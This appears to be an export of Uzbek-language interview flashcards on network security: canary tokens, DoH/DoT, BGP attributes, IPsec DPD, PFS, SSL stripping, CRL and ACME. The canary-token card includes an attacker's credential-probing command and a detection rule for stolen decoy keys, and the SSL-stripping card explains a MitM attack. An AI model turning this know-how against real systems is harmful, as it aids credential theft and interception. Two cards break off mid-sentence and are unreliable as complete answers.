Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41977	<p>Canary token (honeytoken) nima?</p>	<p><b>Qisqa javob:</b> Canary token (honeytoken) — haqiqiy ish uchun hech qachon ishlatilmaydigan, lekin haqiqiyga o'xshaydigan soxta &quot;o'lja&quot;: AWS access key, DB login, URL, hujjat, DNS nomi. Ularni kim ishlatsa yoki ochsa — bu <b>100% shubhali harakat</b>, darhol yuqori prioritetli alert.</p><p><b>Muammo:</b> Hujumchi tarmoqqa kirgandan keyin o'rtacha haftalab sezilmaydi. Oddiy detection'da (anomaliya) false positive ko'p. Canary'ning false positive darajasi deyarli nol: legit foydalanuvchi uni bilmaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>Joylashtirish: ~/.aws/credentials (jump host'da), wiki sahifasi, eski backup,<br>               CI env, DB'dagi &quot;admin_backup&quot; yozuvi<br>Hujumchi: aws sts get-caller-identity --profile prod-backup<br>   -&gt; canary servis CloudTrail'da key ishlatilganini ko'radi<br>   -&gt; alert: qaysi IP, user-agent, vaqt -&gt; SOC / PagerDuty</pre><p><b>Amalda:</b></p><ul><li>canarytokens.org (bepul) — AWS key, Word hujjat, DNS, web bug, kubeconfig token.</li><li>Thinkst Canary — tijoriy, soxta server'lar ham.</li><li>O'zingiz: alohida AWS akkauntda ruxsatsiz IAM user + EventBridge qoidasi:</li></ul><pre>{ &quot;source&quot;: [&quot;aws.sts&quot;, &quot;aws.iam&quot;, &quot;aws.s3&quot;],<br>  &quot;detail&quot;: { &quot;userIdentity&quot;: { &quot;accessKeyId&quot;: [&quot;AKIAXXXXCANARY&quot;] } } }</pre><p>-&gt; SNS -&gt; PagerDuty.</p><p><b>Tuzoqlar:</b></p><ul><li>Canary'ga real ruxsat berish — o'lja quroldga aylanadi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41981	<p>DNS over HTTPS (DoH) va DNS over TLS (DoT) farqi.</p>	<p><b>Qisqa javob:</b> | | DoH (DNS over HTTPS) | DoT (DNS over TLS) | |---|---|---| | Port | 443 (oddiy HTTPS) | 853 (alohida) | | Ko'rinish | web trafikdan farqlab bo'lmaydi | DNS ekanligi ochiq ko'rinadi | | Kim boshqaradi | Ko'pincha ilova (brauzer) | OS/resolver darajasi | | Tarmoq siyosati | Bloklash/monitoring qiyin | Port bo'yicha boshqarish oson | Ikkalasi ham DNS so'rovlarini shifrlaydi va so'rov yo'lida soxtalashtirish/kuzatishni bloklaydi.</p><p><b>Muammo:</b> Klassik DNS (UDP 53) ochiq matnda: ISP, umumiy Wi-Fi egasi qaysi domenlarga kirayotganingizni ko'radi va javobni soxtalashtira oladi.</p><p><b>Qanday ishlaydi:</b></p><pre>Klassik: client --UDP 53 &quot;bank.com?&quot; (ochiq)--&gt; resolver<br>DoT:     client --TCP 853 TLS{ DNS wire format }--&gt; resolver<br>DoH:     client --TCP 443 TLS{ POST /dns-query application/dns-message }--&gt; resolver<br>Resolver -&gt; authoritative: hali ham ochiq (DNSSEC yaxlitlikni beradi, maxfiylikni emas)</pre><p><b>Amalda:</b></p><pre>kdig -d @1.1.1.1 +tls example.com                 # DoT<br>curl -s -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=example.com&amp;type=A' | jq<br>resolvectl status   # systemd-resolved: DNSOverTLS=yes|opportunistic</pre><p>Linux'da DoT: <code>/etc/systemd/resolved.conf</code> -&gt; <code>DNS=1.1.1.1#cloudflare-dns.com</code>, <code>DNSOverTLS=yes</code>.</p><p><b>Korporativ kontekst:</b></p><ul><li>Brauzer DoH'ni yoqsa ichki DNS (split-horizon), DNS asosidagi xavfsizlik filtri va logging chetlab o'tiladi.</li><li>Firefox uchun canary domen <code>use-application-dns.net</code> — NXDOMAIN qaytarsangiz avtomatik DoH o'chadi; MDM policy bilan ham boshqariladi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Malware DoH orqali C2 bilan aloqa qiladi — DNS log'ingiz bo'sh. Ma'lum DoH provider IP'larini egress'da cheklang.</li><li>DoH ichki domenlarni (<code>*.corp</code>) hal qilolmaydi — ilovalar sinadi.</li></ul><p><b>Senior nuqta:</b> Korxonada: o'z resolver'ingizni DoH/DoT bilan taqdim eting (maxfiylik + nazorat), tashqi DoH'ni policy bilan bloklang. Uy foydalanuvchisi uchun DoH — aniq yutuq.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41982	<p>Root DNS serverlarida Anycast qanday ishlatiladi?</p>	<p><b>Qisqa javob:</b> Root zona 13 ta nomlangan server IP'lariga (<code>a.root-servers.net</code> ... <code>m.root-servers.net</code>) ega, lekin har bir IP <b>Anycast</b> bilan dunyo bo'ylab ko'p joydan e'lon qilinadi — jami ~1900+ fizik instance. Resolver BGP bo'yicha eng yaqin nusxaga tushadi.</p><p><b>Nega aynan 13:</b> Eski cheklov — barcha root server NS+A yozuvlari bitta 512 baytlik UDP DNS javobiga sig'ishi kerak edi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41983	<p>BGP MED (Multi-Exit Discriminator) nima?</p>	<p><b>Qisqa javob:</b> MED (Multi-Exit Discriminator) — siz qo'shni AS'ga (provayderingizga) &quot;menga kirish uchun qaysi link'ni afzal ko'r&quot; deb <b>maslahat</b> beradigan BGP atributi. Qiymati kichik bo'lgan yo'l afzal. Non-transitive: faqat bevosita qo'shni AS'ga o'tadi, undan narida tarqalmaydi.</p><p><b>Muammo:</b> Kompaniyangiz bitta provayderga ikki joydan ulangan: Toshkent (10 Gbps) va Samarqand (1 Gbps). Kiruvchi trafik Toshkent link'idan kelishini xohlaysiz. Kiruvchi trafikni boshqarish qiyin — qaror boshqa AS'da qabul qilinadi.</p><p><b>Qanday ishlaydi:</b></p><pre>Sizning AS 64500                        Provayder AS 65000<br>  R-Tashkent --e'lon 203.0.113.0/24, MED 10 --&gt; PE1<br>  R-Samarqand --e'lon 203.0.113.0/24, MED 100 --&gt; PE2<br>Provayder: boshqa atributlar teng bo'lsa -&gt; MED 10 -&gt; PE1 orqali yuboradi<br>BGP tanlov tartibi (qisqacha): Weight &gt; Local Pref &gt; lokal origin &gt; AS-path uzunligi &gt; Origin &gt; MED &gt; eBGP&gt;iBGP &gt; IGP metric</pre><p>Ya'ni MED Local Pref va AS-path'dan <b>keyin</b> tekshiriladi — kuchsiz signal.</p><p><b>Amalda (FRR/Cisco uslubi):</b></p><pre>route-map SET-MED-PRIMARY permit 10<br> set metric 10<br>route-map SET-MED-BACKUP permit 10<br> set metric 100<br>router bgp 64500<br> neighbor 198.51.100.1 route-map SET-MED-PRIMARY out<br> neighbor 198.51.100.5 route-map SET-MED-BACKUP out</pre><pre>vtysh -c 'show ip bgp 203.0.113.0/24'    # metric ustuni</pre><p><b>Tuzoqlar:</b></p><ul><li>Default holatda MED faqat <b>bir xil qo'shni AS</b>dan kelgan yo'llar orasida solishtiriladi (<code>always-compare-med</code> bo'lmasa) — ikki xil provayderga MED berish ma'nosiz.</li><li>Provayder MED'ni e'tiborsiz qoldirishi mumkin (o'z Local Pref siyosati) — kelishuv kerak.</li><li>MED yo'q bo'lsa vendor'ga qarab 0 (eng yaxshi) yoki eng yomon deb hisoblanadi.</li></ul><p><b>Senior nuqta:</b> Kiruvchi trafik muhandisligi uchun ishonchlilik tartibi: provayder BGP community'lari &gt; AS-path prepending &gt; MED. MED — bitta provayder bilan ko'p link holatida qulay.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41984	<p>BGP AS-Path prepending nima?</p>	<p><b>Qisqa javob:</b> AS-path prepending — prefiksni e'lon qilganda o'z AS raqamingizni yo'lga <b>qo'shimcha marta</b> qo'shish (<code>64500 64500 64500</code>). BGP qisqa AS-path'ni afzal ko'rgani uchun, tashqi tarmoqlar uzun yo'lli link'ni kamroq tanlaydi — shu bilan backup link'ga kiruvchi trafikni kamaytirasiz. MED'dan farqli, bu turli provayderlar orasida ham ishlaydi.</p><p><b>Muammo:</b> Ikki provayder: ISP-A (asosiy, arzon) va ISP-B (backup, qimmat). Internet trafikni qaysi biri orqali yuborishini siz emas, boshqa tarmoqlar hal qiladi. Ko'pchilik ISP-B'ni ham tanlaydi — pul ketadi.</p><p><b>Qanday ishlaydi:</b></p><pre>ISP-A orqali e'lon:  203.0.113.0/24  AS-path: 64500<br>ISP-B orqali e'lon:  203.0.113.0/24  AS-path: 64500 64500 64500<br>Uzoqdagi router ko'radi:<br>   ... 1299 ISP-A 64500                 (4 hop)<br>   ... 3356 ISP-B 64500 64500 64500     (6 hop)  -&gt; kam afzal<br>ISP-A link uzilsa -&gt; faqat ISP-B yo'li qoladi -&gt; avtomatik failover</pre><p><b>Amalda:</b></p><pre>route-map TO-ISP-B permit 10<br> set as-path prepend 64500 64500<br>router bgp 64500<br> neighbor 192.0.2.1 route-map TO-ISP-B out</pre><p>Natijani <b>tashqaridan</b> tekshiring:</p><pre># looking glass / RIPE RIS / bgp.tools da prefiksingiz yo'llari<br>curl -s &quot;https://stat.ripe.net/data/looking-glass/data.json?resource=203.0.113.0/24&quot; | jq '.data.rrcs[].peers[].as_path' | head</pre><p><b>Tuzoqlar:</b></p><ul><li>Haddan tashqari prepend (10+ marta) — ta'sir qo'shimcha oshmaydi, ba'zi tarmoqlar uzun path'larni filtrlaydi va ko'rinmay qolasiz.</li><li>Ba'zi tarmoqlar Local Pref bilan &quot;o'z mijozi&quot; yo'lini baribir afzal ko'radi — prepend yordam bermaydi. ISP-B mijozlari ISP-B orqali kelishda davom etadi.</li><li>Prepend'dan keyin trafik o'zgarishini monitoring'siz qoldirish.</li></ul><p><b>Senior nuqta:</b> Prepending — qo'pol vosita, trafikni &quot;kamaytiradi&quot;, lekin to'liq boshqarmaydi. Aniqroq nazorat uchun provayderning BGP community'larini (masalan &quot;faqat mijozlarga e'lon qil&quot;, &quot;prepend qil ma'lum mintaqaga&quot;) ishlating.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41985	<p>BGP Local Preference nima?</p>	<p><b>Qisqa javob:</b> Local Preference — AS <b>ichida</b> chiquvchi trafik uchun qaysi chiqish yo'li afzalligini belgilaydigan BGP atributi. Qiymat qancha <b>katta</b> bo'lsa, shuncha afzal (default 100). U iBGP orqali AS'dagi barcha router'larga tarqaladi, lekin tashqi AS'larga yuborilmaydi. BGP tanlovida juda erta (Weight'dan keyin) tekshiriladi — kuchli vosita.</p><p><b>Muammo:</b> Sizda ikki provayder: ISP-A (10 Gbps, flat narx) va ISP-B (1 Gbps, har GB uchun to'lov). Ikkalasi ham internetning to'liq jadvalini beradi. Chiquvchi trafik hammasi ISP-A orqali ketishi kerak, ISP-B faqat zaxira.</p><p><b>Qanday ishlaydi:</b></p><pre>            AS 64500 (siz)<br>  R1 --eBGP-- ISP-A   kiruvchi route'larga local-pref 200<br>  R2 --eBGP-- ISP-B   kiruvchi route'larga local-pref 50<br>  R1 &lt;--iBGP--&gt; R2 : har ikkisi bir xil tanlaydi -&gt; ISP-A<br>ISP-A uzilsa -&gt; ISP-A route'lari yo'qoladi -&gt; lp 50 yagona -&gt; ISP-B<br>Chiquvchi = LocalPref,  kiruvchi = MED / prepend / community</pre><p><b>Amalda:</b></p><pre>route-map FROM-ISP-A permit 10<br> set local-preference 200<br>route-map FROM-ISP-B permit 10<br> set local-preference 50<br>router bgp 64500<br> neighbor 198.51.100.1 route-map FROM-ISP-A in<br> neighbor 192.0.2.1    route-map FROM-ISP-B in</pre><pre>vtysh -c 'show ip bgp 8.8.8.0/24'    # LocPrf ustuni, &quot;&gt;&quot; tanlangan yo'l</pre><p>Tipik naqsh: mijoz route'lari 300 &gt; peer 200 &gt; tranzit 100 (pul oqimiga mos).</p><p><b>Tuzoqlar:</b></p><ul><li>Local Pref faqat <b>chiquvchi</b> trafikka ta'sir qiladi — kiruvchini boshqarmaydi (eng ko'p uchraydigan chalkashlik).</li><li>Route-map'ni <code>out</code> yo'nalishda qo'yish — eBGP'da yuborilmaydi, ta'sir yo'q.</li><li>Barcha route'larga yuqori LP berib, keyin aniqroq qoidalar qo'shmaslik — asimmetrik routing va stateful firewall muammolari.</li></ul><p><b>Senior nuqta:</b> BGP siyosatini &quot;pul qayerdan keladi/ketadi&quot; mantiqi bilan loyihalang. Kiruvchi va chiquvchi yo'llar asimmetrik bo'lishi tabiiy — firewall va monitoring buni ko'tara olishini tekshiring.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41986	<p>IPsec Dead Peer Detection (DPD) nima?</p>	<p><b>Qisqa javob:</b> DPD (Dead Peer Detection, RFC 3706; IKEv2'da liveness check) — IPsec tunnel'ning ikki uchi bir-birining tirikligini davriy tekshiradi: trafik bo'lmasa R-U-THERE (bo'sh INFORMATIONAL) xabar yuboriladi, javob kelmasa SA'lar o'chiriladi va tunnel qayta quriladi yoki zaxira peer'ga o'tiladi.</p><p><b>Muammo:</b> Uzoq ofis router'i reboot bo'ldi va SA'larni yo'qotdi. Markaziy gateway esa hali &quot;eski&quot; SA bilan paket yuboryapti — ular qora tuynukka ketadi. DPD bo'lmasa bu SA lifetime tugaguncha (soatlab) davom etadi.</p><p><b>Qanday ishlaydi:</b></p><pre>gateway A                        gateway B (o'chib qolgan)<br>  trafik yo'q, dpd_delay (30s) o'tdi<br>  --- INFORMATIONAL (bo'sh) --&gt;  javob yo'q<br>  --- qayta (retransmit)   --&gt;  javob yo'q<br>  dpd_timeout / retransmit tugadi -&gt; peer o'lik<br>  action: clear | hold | restart (qayta initiate)<br>Trafik bor bo'lsa — DPD xabari shart emas (on-demand)</pre><p><b>Amalda (strongSwan):</b></p><pre>connections {<br>  site-b {<br>    dpd_delay = 30s<br>    children { net { dpd_action = restart  start_action = start } }<br>  }<br>}</pre><pre>swanctl --list-sas<br>journalctl -u strongswan | grep -iE 'dead peer|retransmit|DPD'</pre><p>AWS Site-to-Site VPN: DPD timeout 30s, action <code>clear</code>/<code>restart</code>/<code>none</code> — tunnel opsiyalarida.</p><p><b>Tuzoqlar:</b></p><ul><li>Bir tomon <code>restart</code>, ikkinchisi <code>clear</code> va hech biri initiate qilmaydi — tunnel o'zi tiklanmaydi. Kamida bitta tomon doim initiator bo'lsin.</li><li>Juda agressiv DPD (5s) — qisqa paket yo'qotishda tunnel &quot;flapping&quot;.</li><li>NAT ortida DPD + NAT keepalive (UDP 4500) ikkalasi ham kerak.</li></ul><p><b>Senior nuqta:</b> AWS VPN'ning ikkita tunnel'i bor — DPD + BGP (route'larni tez olib tashlash) birgalikda haqiqiy failover beradi. Statik routing + DPD'siz ikkinchi tunnel amalda foydasiz.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41987	<p>Perfect Forward Secrecy (PFS) nima?</p>	<p><b>Qisqa javob:</b> Perfect Forward Secrecy (PFS) — har sessiya uchun <b>ephemeral</b> (bir martalik) Diffie-Hellman kalit juftligi bilan sessiya kaliti hosil qilish. Server'ning uzoq muddatli private kaliti (sertifikat kaliti) keyinchalik o'g'irlansa ham, oldin yozib olingan trafikni ochib bo'lmaydi — chunki sessiya kalitlari o'chirilgan va qayta hosil qilinmaydi.</p><p><b>Muammo:</b> Eski TLS RSA key exchange'da client sessiya secret'ini server'ning RSA public key'i bilan shifrlab yuborgan. Davlat yoki hujumchi yillar davomida shifrlangan trafikni yozib boradi; keyin server kaliti sizib chiqsa (Heartbleed, xato backup) — <b>barcha</b> eski trafik ochiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>RSA kex (PFS yo'q):  premaster --RSA_enc(server_pub)--&gt; server   [kalit sizsa -&gt; hammasi ochiq]<br>ECDHE (PFS bor):<br>  client: a (tasodifiy, vaqtinchalik), A = a*G  ---&gt;<br>  server: b (vaqtinchalik),          B = b*G  &lt;--- (B server sertifikat kaliti bilan IMZOLANADI)<br>  ikkalasi: shared = a*B = b*A  -&gt; HKDF -&gt; sessiya kalitlari<br>  a va b o'chiriladi. Sertifikat kaliti faqat autentifikatsiya uchun.</pre><p><b>Amalda:</b></p><pre>openssl s_client -connect example.com:443 -tls1_2 &lt;/dev/null 2&gt;/dev/null | grep -E 'Cipher|Server Temp Key'<br># Cipher: ECDHE-RSA-AES128-GCM-SHA256 ; Server Temp Key: X25519<br>nmap --script ssl-enum-ciphers -p 443 example.com</pre><p>nginx (TLS 1.2 uchun):</p><pre>ssl_protocols TLSv1.2 TLSv1.3;<br>ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305;</pre><p>TLS 1.3'da RSA key exchange umuman yo'q — PFS majburiy.</p><p><b>Tuzoqlar:</b></p><ul><li>TLS <b>session ticket</b> kaliti uzoq vaqt rotate qilinmasa — u sizsa resumption'li sessiyalar ochiladi va PFS yo'qoladi. Ticket kalitlarini tez-tez almashtiring.</li><li>Ba'zi korporativ IDS/DLP passiv decryption uchun RSA kex talab qiladi — PFS bilan ishlamaydi (to'g'ri yechim: proxy).</li><li>IPsec'da PFS — alohida opsiya (Child SA rekey'da yangi DH); default o'chiq bo'lishi mumkin.</li></ul><p><b>Senior nuqta:</b> PFS &quot;harvest now, decrypt later&quot;ga qarshi klassik himoya; post-quantum davrda esa DH'ning o'zi xavf ostida — shuning uchun hybrid ML-KEM kalit almashinuvi qo'shilmoqda.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41988	<p>SSL stripping hujumi nima?</p>	<p><b>Qisqa javob:</b> SSL stripping — MitM hujumchi foydalanuvchining HTTP-&gt;HTTPS o'tishini to'xtatadi: server bilan HTTPS, qurbon bilan esa <b>ochiq HTTP</b> orqali gaplashadi va sahifadagi <code>https://</code> havolalarni <code>http://</code> ga almashtiradi. Qurbon parolni ochiq kiritadi, hujumchi ko'radi. Asosiy himoya — HSTS (ayniqsa preload).</p><p><b>Muammo:</b> Foydalanuvchi brauzerga <code>bank.com</code> yozadi (protokolsiz) -&gt; brauzer <code>http://bank.com</code> ga boradi -&gt; server 301 bilan HTTPS'ga yo'naltiradi. Ana shu birinchi ochiq so'rov — hujum oynasi (kafe Wi-Fi, soxta access point).</p><p><b>Qanday ishlaydi:</b></p><pre>Qurbon --HTTP--&gt; [Hujumchi (ARP spoof / soxta AP)] --HTTPS--&gt; bank.com<br>       &lt;--HTTP--   javobdagi https:// -&gt; http:// almashtiradi   &lt;--HTTPS--<br>Qurbon login formasi -&gt; http://bank.com/login -&gt; hujumchi parolni o'qiydi<br>Brauzerda qulf belgisi yo'q — lekin ko'pchilik sezmaydi</pre><p><b>Himoya:</b></p><pre>server { listen 80; return 301 https://$host$request_uri; }<br>server {<br>  listen 443 ssl;<br>  add_header Strict-Transport-Security &quot;max-age=63072000; includeSubDomains; preload&quot; always;<br>}</pre><ul><li><b>HSTS</b> — ikkinchi tashrifdan boshlab brauzer HTTP'ga umuman bormaydi.</li><li><b>HSTS preload</b> (hstspreload.org) — birinchi tashrif ham himoyalangan.</li><li>Cookie'larda <code>Secure</code> — HTTP orqali yuborilmaydi.</li><li>Brauzerlarning &quot;HTTPS-First / HTTPS-Only&quot; rejimi (Chrome 2025 da default'ga yaqinlashmoqda).</li></ul><p><b>Tekshirish:</b></p><pre>curl -sI http://example.com | head -3           # 301 -&gt; https<br>curl -sI https://example.com | grep -i strict</pre><p><b>Tuzoqlar:</b></p><ul><li>HSTS faqat asosiy domenda, <code>includeSubDomains</code>siz — <code>login.example.com</code> zaif qoladi.</li><li>Birinchi tashrif muammosi preload'siz qoladi.</li><li>Mobil ilova API'ni HTTP orqali chaqirsa — HSTS ilovada ishlamaydi; ATS/cleartext taqiqlash kerak.</li></ul><p><b>Senior nuqta:</b> SSL stripping (Moxie Marlinspike, 2009) HSTS'ning paydo bo'lish sababi. Bugun himoya oddiy: HTTPS hamma joyda + HSTS preload + Secure cookie. Bularsiz TLS sertifikati o'zi yetarli emas.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41989	<p>CRL (Certificate Revocation List) nima?</p>	<p><b>Qisqa javob:</b> CRL (Certificate Revocation List) — CA tomonidan imzolangan, muddatidan oldin bekor qilingan sertifikatlar <b>seriya raqamlari ro'yxati</b>, <code>thisUpdate</code>/<code>nextUpdate</code> vaqtlari bilan. Client sertifikatdagi CRL Distribution Point URL'idan ro'yxatni yuklab, sertifikat unda yo'qligini tekshiradi.</p><p><b>Muammo:</b> Server kaliti o'g'irlandi. Sertifikat yana 6 oy amal qiladi — hujumchi soxta server qo'yib, haqiqiy sertifikat bilan foydalanuvchilarni aldaydi. Revocation — &quot;bu sertifikatga endi ishonma&quot; deyish yo'li.</p><p><b>Qanday ishlaydi:</b></p><pre>CA: revoke(serial 0x1A2B, reason=keyCompromise) -&gt; yangi CRL imzolaydi -&gt; http://crl.ca.com/r3.crl<br>Client: sertifikat -&gt; CRLDP URL -&gt; CRL yuklash (cache nextUpdate'gacha) -&gt; serial ro'yxatdami?<br>Muammolar: ro'yxat katta (MB), yangilanish kechikishi (soat/kun), yuklab bo'lmasa soft-fail</pre><p><b>Amalda:</b></p><pre>openssl x509 -in cert.pem -noout -ext crlDistributionPoints<br>curl -s http://crl.example-ca.com/ca.crl -o ca.crl<br>openssl crl -in ca.crl -inform DER -noout -text | head -20     # Last/Next Update, serial'lar<br>openssl verify -crl_check -CAfile chain.pem -CRLfile ca.pem cert.pem</pre><p>Ichki PKI'da (Vault PKI):</p><pre>vault write pki/revoke serial_number=&quot;1a:2b:...&quot;<br>vault read pki/crl/rotate</pre><p><b>2025-2026 holati:</b></p><ul><li>Let's Encrypt OCSP'ni to'xtatib, faqat CRL'ga o'tdi (2025).</li><li>Brauzerlar CRL'larni o'zlari yig'ib siqilgan holda tarqatadi (Firefox CRLite, Chrome CRLSets) — client har sayt uchun yuklamaydi.</li><li>CA/B Forum: sertifikat muddati bosqichma-bosqich 47 kungacha qisqaradi (2029) — revocation'ga bog'liqlik kamayadi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Ichki servislar (mTLS) CRL'ni umuman tekshirmaydi — revoke qilingan client sertifikati ishlayveradi. Tekshirishni yoqing yoki qisqa umrli sertifikatlar.</li><li>CRL <code>nextUpdate</code> o'tib ketsa va yangisi yo'q — strict client'lar hamma sertifikatni rad etadi (outage).</li></ul><p><b>Senior nuqta:</b> Ichki PKI dizaynida revocation'ga tayanmang — sertifikat umrini soatlar/kunlar bilan cheklang (cert-manager, SPIFFE). Revocation — zaxira mexanizm.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41990	<p>ACME protokoli nima?</p>	<p><b>Qisqa javob:</b> ACME (Automatic Certificate Management Environment, RFC 8555) — CA bilan <b>avtomatik</b> sertifikat olish protokoli: akkaunt yaratish, buyurtma (order), domen egaligini isbotlash (challenge: HTTP-01, DNS-01, TLS-ALPN-01), CSR yuborish va sertifikatni yuklab olish. Let's Encrypt, ZeroSSL, Google Trust Services, ichki CA'lar (step-ca, Vault PKI) qo'llaydi.</p><p><b>Muammo:</b> Qo'lda sertifikat: CSR yaratish, CA saytida to'lash, email orqali tasdiqlash, faylni serverga ko'chirish — yiliga bir marta, va har safar kimdir unutadi -&gt; &quot;sertifikat muddati o'tdi&quot; outage. Muddat 47 kunga qisqarayotganda qo'lda boshqarish imkonsiz.</p><p><b>Qanday ishlaydi:</b></p><pre>Client (certbot/cert-manager/Caddy)          ACME server (LE)<br> 1. newAccount (JWS bilan imzolangan) ------&gt;<br> 2. newOrder [example.com] ----------------&gt;  authorization + challenge'lar<br> 3. challenge'ni bajaradi (fayl yoki TXT qo'yadi)<br> 4. &quot;tayyor&quot; -------------------------------&gt;  CA tekshiradi (bir nechta joydan)<br> 5. finalize (CSR) -------------------------&gt;<br> 6. sertifikat &lt;-----------------------------  download<br> Har ~60 kunda (yoki ARI tavsiyasi bo'yicha) avtomatik yangilash</pre><p><b>Amalda:</b></p><pre>certbot certonly --nginx -d example.com -d www.example.com<br>certbot renew --dry-run<br>systemctl list-timers | grep certbot</pre><p>Kubernetes cert-manager:</p><pre>apiVersion: cert-manager.io/v1<br>kind: ClusterIssuer<br>metadata: { name: letsencrypt }<br>spec:<br>  acme:<br>    server: https://acme-v02.api.letsencrypt.org/directory<br>    email: ops@example.com<br>    privateKeySecretRef: { name: le-account }<br>    solvers: [ { http01: { ingress: { ingressClassName: nginx } } } ]</pre><p><b>Tuzoqlar:</b></p><ul><li>Rate limit (LE: domen uchun haftasiga 50 sertifikat, xato validatsiyalar limiti) — test uchun <b>staging</b> endpoint ishlating.</li><li>Yangilash ishlaydi, lekin servis yangi faylni qayta yuklamaydi (nginx reload hook yo'q).</li><li>Expiry monitoring'siz qoldirish — &quot;avtomatik&quot; jim sinishi mumkin (DNS o'zgardi, 80-port yopildi).</li></ul><p><b>Senior nuqta:</b> ACME + qisqa umr + expiry alert (Prometheus <code>blackbox_exporter</code> <code>probe_ssl_earliest_cert_expiry</code>) — sertifikat outage'larini butunlay yo'q qiladi. ARI (RFC 9773) bilan CA yangilash vaqtini o'zi tavsiya qiladi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41991	<p>ACME HTTP-01 va DNS-01 challenge farqi.</p>	<p><b>Qisqa javob:</b> | | HTTP-01 | DNS-01 | |---|---|---| | Isbot | <code>http://&lt;domen&gt;/.well-known/acme-challenge/&lt;token&gt;</code> faylini qo'yish | <code>_acme-challenge.&lt;domen&gt;</code> TXT yozuvini qo'yish | | Talab | 80-port internetdan ochiq | DNS provayder API credential | | Wildcard (<code>*.example.com</code>) | Yo'q | <b>Faqat shu</b> | | Ichki/yopiq server | Ishlamaydi | Ishlaydi | | Bir nechta LB orqasida | Token hamma node'da bo'lishi kerak | Muammo yo'q | Uchinchisi — TLS-ALPN-01 (443-port orqali, maxsus sertifikat bilan).</p><p><b>Qanday ishlaydi:</b></p><pre>HTTP-01:  LE (ko'p joydan) --GET :80/.well-known/acme-challenge/abc--&gt; sizning server<br>          javob = token.thumbprint  -&gt; mos -&gt; domen sizniki<br>DNS-01:   client -&gt; DNS API: TXT _acme-challenge.example.com = &quot;base64(sha256(keyAuth))&quot;<br>          LE -&gt; DNS so'rov (authoritative NS'lar) -&gt; mos -&gt; tasdiq</pre><p><b>Amalda:</b></p><pre># HTTP-01<br>certbot certonly --webroot -w /var/www/html -d app.example.com<br>curl http://app.example.com/.well-known/acme-challenge/test   # 80-port tekshiruv<br># DNS-01 (Cloudflare)<br>certbot certonly --dns-cloudflare --dns-cloudflare-credentials ~/.cf.ini \<br>  -d example.com -d '*.example.com'<br>dig +short TXT _acme-challenge.example.com @1.1.1.1</pre><p>cert-manager'da <code>solvers: - dns01: { route53: { region: eu-central-1 } }</code> (IRSA bilan).</p><p><b>Tuzoqlar:</b></p><ul><li>DNS-01 API token'i ko'pincha <b>butun zonani</b> o'zgartira oladi — sizsa domeningiz o'g'irlanadi. Minimal ruxsat yoki <code>_acme-challenge</code>ni alohida zonaga CNAME delegatsiya qiling (acme-dns).</li><li>DNS propagation kutilmasa validatsiya muvaffaqiyatsiz — <code>propagation-seconds</code>.</li><li>HTTP-01'da HTTP-&gt;HTTPS redirect muammo emas (LE redirect'ga ergashadi), lekin WAF/geo-blok LE'ni bloklasa — ishlamaydi.</li></ul><p><b>Senior nuqta:</b> Default qoida: public web servis — HTTP-01 (oddiy); wildcard, ichki servis yoki ko'p klaster — DNS-01 + CNAME delegatsiya. DNS credential'ni eng yuqori sezgirlikdagi secret deb qarang.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41992	<p>ECC va RSA farqi.</p>	<p><b>Qisqa javob:</b> ECC (Elliptic Curve: ECDSA P-256, Ed25519, X25519) RSA bilan <b>teng xavfsizlikni ancha kichik kalit</b> bilan beradi: 256-bit ECC ~ 3072-bit RSA (~128-bit xavfsizlik). Natija: kichik sertifikat, tezroq imzolash va kalit almashinuvi, kam CPU. RSA'ning ustunligi — imzo <b>tekshirish</b> tez va eng keng moslik.</p><p><b>Taqqoslash:</b> | Xavfsizlik (bit) | RSA kalit | ECC kalit | |---|---|---| | 112 | 2048 | 224 | | 128 | 3072 | 256 | | 192 | 7680 | 384 | | Operatsiya | RSA-2048 | ECDSA P-256 | | Imzolash (server) | sekin | ~10x tez | | Tekshirish (client) | juda tez | sekinroq |</p><p><b>Muammo:</b> Yuqori yuklangan TLS terminator (sekundiga minglab handshake) — RSA-2048 imzolash CPU'ning katta qismini yeydi. RSA-4096 ga o'tish uni yana ~5-7 barobar sekinlashtiradi.</p><p><b>Amalda:</b></p><pre>openssl ecparam -genkey -name prime256v1 -out ec.key        # ECDSA P-256<br>openssl genpkey -algorithm ed25519 -out ed.key<br>openssl req -new -key ec.key -subj &quot;/CN=example.com&quot; -out ec.csr<br>openssl speed rsa2048 ecdsap256                              # o'z CPU'ingizda o'lchang<br>ssh-keygen -t ed25519 -C &quot;dev@example.com&quot;                   # SSH uchun default tanlov</pre><p>nginx'da ikkala sertifikat (eski client'lar uchun RSA fallback):</p><pre>ssl_certificate     /etc/ssl/ecdsa.crt;  ssl_certificate_key /etc/ssl/ecdsa.key;<br>ssl_certificate     /etc/ssl/rsa.crt;    ssl_certificate_key 